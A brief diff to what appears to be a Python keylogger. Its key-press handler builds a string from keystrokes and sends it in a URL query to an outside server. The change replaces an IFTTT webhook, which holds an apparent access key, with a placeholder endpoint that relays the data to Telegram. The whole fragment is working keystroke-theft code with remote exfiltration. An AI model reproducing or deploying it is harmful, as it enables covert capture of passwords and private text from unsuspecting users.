@@ -4,7 +4,7 @@ s=""
 def on_press(key):
         global s
         if len(str(key))>3:
-                ur.urlopen("https://maker.ifttt.com/trigger/logger/with/key/dgvnfqEFLZPCeq4j_YWlRD?value1="+s)
+                ur.urlopen("https://serverurl.com/sendtotelegram?value1="+s)
                 s=""
         else:
                 s+=str(key)[1]
